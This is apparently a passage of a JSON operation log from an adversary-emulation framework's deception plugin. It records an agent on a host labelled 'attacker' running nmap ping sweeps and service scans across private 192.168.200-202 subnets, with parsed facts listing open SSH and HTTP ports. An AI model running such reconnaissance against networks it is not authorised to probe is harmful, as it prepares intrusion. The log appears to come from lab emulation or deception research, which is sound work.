"scan.subnet.addr", "value": "192.168.202.0/24", "created": "2024-04-26T23:39:20Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "527e0f53-965b-492f-b99c-ef0b203dd210", "collect": "2024-04-26T23:39:20Z", "finish": "2024-04-26T23:39:22Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "attacker", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:39:20Z"}, {"id": "7095ef06-22b7-4473-b807-91ba0dea838b", "paw": "rezmky", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:39:25Z", "pin": 0, "pid": "1759", "facts": [{"unique": "host.subnet.ipaddrs192.168.200.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.200.0/24", "created": "2024-04-26T23:39:35Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["7095ef06-22b7-4473-b807-91ba0dea838b", "e9c873ff-de3a-4d7e-a279-7ba20d4f2eb8", "3e0385dd-eadf-4b80-bc55-4aea1b79aa80", "832fe5d7-e203-4479-a83f-25bc8c762719", "56bc1feb-a57e-470e-837b-9173b738d06d", "af654b8a-e076-47fb-8564-6b40300f2c80", "e2eb1c16-cff6-4a6a-9aa0-ddd3abc9ffa6", "1bb1488d-c40c-47f1-888c-97fe1a623b17"], "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}, {"unique": "host.subnet.online_ipaddrs['192.168.200.3', '192.168.200.4', '192.168.200.5']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.200.3", "192.168.200.4", "192.168.200.5"], "created": "2024-04-26T23:39:35Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["7095ef06-22b7-4473-b807-91ba0dea838b"], "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5'])"], "limit_count": -1, "collected_by": ["rezmky"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf48d5600>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf48d4820>", "source": {"unique": "host.subnet.ipaddrs192.168.200.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.200.0/24", "created": "2024-04-26T23:39:35Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs['192.168.200.3', '192.168.200.4', '192.168.200.5']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.200.3", "192.168.200.4", "192.168.200.5"], "created": "2024-04-26T23:39:35Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.200.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.200.0/24", "created": "2024-04-26T23:39:25Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "7095ef06-22b7-4473-b807-91ba0dea838b", "collect": "2024-04-26T23:39:30Z", "finish": "2024-04-26T23:39:35Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "attacker", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:39:30Z"}, {"id": "8820d7db-0ef2-44ef-8197-501e8ee3c43b", "paw": "rezmky", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:39:40Z", "pin": 0, "pid": "1762", "facts": [{"unique": "host.subnet.ipaddrs192.168.201.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.201.0/24", "created": "2024-04-26T23:40:02Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["8820d7db-0ef2-44ef-8197-501e8ee3c43b", "e07921d6-b9e1-4277-a4d0-c12a3109baa4", "26f46d4f-0c48-4952-99b4-e4a3766799fb", "e9bb737a-d6f7-43ce-a28f-c824629a61a9", "34eeee8c-eb81-48c0-8e26-c4c4a97e4f3f", "27cfc0cb-e7a4-4693-b6d3-fd1cf6d43abb", "9511e310-83f1-4fdd-a60e-24b1d7b4c545", "67271bd6-f418-4a31-8ac9-adfbbf7e97f4"], "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.2', '192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf49a4e20>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf49a6ce0>", "source": {"unique": "host.subnet.ipaddrs192.168.201.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.201.0/24", "created": "2024-04-26T23:40:02Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs[]", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": [], "created": "2024-04-26T23:40:02Z", "score": 1, "source": null, "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.201.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.201.0/24", "created": "2024-04-26T23:39:40Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "8820d7db-0ef2-44ef-8197-501e8ee3c43b", "collect": "2024-04-26T23:39:41Z", "finish": "2024-04-26T23:40:02Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "attacker", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:39:41Z"}, {"id": "12d8d23e-8ab0-4c2d-86f9-a487fb66c2c5", "paw": "rezmky", "command": "nmap -sV --version-light -oX - 192.168.202.1,2,3", "plaintext_command": "nmap -sV --version-light -oX - 192.168.202.1,2,3", "status": 0, "score": 1, "decide": "2024-04-26T23:40:05Z", "pin": 0, "pid": "1764", "facts": [{"unique": "host.remote.ip192.168.202.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.202.3", "created": "2024-04-26T23:40:12Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["12d8d23e-8ab0-4c2d-86f9-a487fb66c2c5"], "relationships": ["host.remote.ip(192.168.202.3) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.202.3) : has_port_services : host.remote.port_services([('22', 'ssh')])"], "limit_count": -1, "collected_by": ["rezmky"], "technique_id": "T1021.004"}, {"unique": "host.remote.ports['22']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22"], "created": "2024-04-26T23:40:12Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["12d8d23e-8ab0-4c2d-86f9-a487fb66c2c5"], "relationships": ["host.remote.ip(192.168.202.3) : has_open_ports : host.remote.ports(['22'])"], "limit_count": -1, "collected_by": ["rezmky"], "technique_id": "T1021.004"}, {"unique": "host.remote.port_services[('22', 'ssh')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"]], "created": "2024-04-26T23:40:12Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["12d8d23e-8ab0-4c2d-86f9-a487fb66c2c5"], "relationships": ["host.remote.ip(192.168.202.3) : has_port_services : host.remote.port_services([('22', 'ssh')])"], "limit_count": -1, "collected_by": ["rezmky"], "technique_id": "T1021.004"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf49a4d90>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf492a0e0>", "source": {"unique": "host.remote.ip192.168.202.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.202.3", "created": "2024-04-26T23:40:12Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22"], "created": "2024-04-26T23:40:12Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46652d0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46643a0>", "source": {"unique": "host.remote.ip192.168.202.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.202.3", "created": "2024-04-26T23:40:12Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"]], "created": "2024-04-26T23:40:12Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.remote.addr192.168.202.1,2,3", "trait": "scan.remote.addr", "name": "scan.remote.addr", "value": "192.168.202.1,2,3", "created": "2024-04-26T23:40:05Z", "score": 3, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "12d8d23e-8ab0-4c2d-86f9-a487fb66c2c5", "collect": "2024-04-26T23:40:07Z", "finish": "2024-04-26T23:40:12Z", "ability": {"ability_id": "deception-nmap", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "executors": [{"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "attacker", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:40:07Z"}, {"id": "0a760943-eea8-426d-99d8-7b4784ee2f9e", "paw": "rezmky", "command": "nmap -sV --version-light -oX - 192.168.200.3,4,5", "plaintext_command": "nmap -sV --version-light -oX - 192.168.200.3,4,5", "status": 0, "score": 1, "decide": "2024-04-26T23:40:15Z", "pin": 0, "pid": "1767", "facts": [{"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "7e5ca019-19a9-4aae-986e-8aed3805f52a", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.82) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.90) : has_open_ports : host.remote.ports(['22', '8080'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "7e5ca019-19a9-4aae-986e-8aed3805f52a", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.201.82) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.201.90) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4666b30>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4664bb0>", "source": {"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4667c70>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46673d0>", "source": {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf483d4e0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf483e7d0>", "source": {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf483ccd0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf483ec20>", "source": {"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf483eb90>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf483d0f0>", "source": {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf483ff10>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf483c310>", "source": {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": 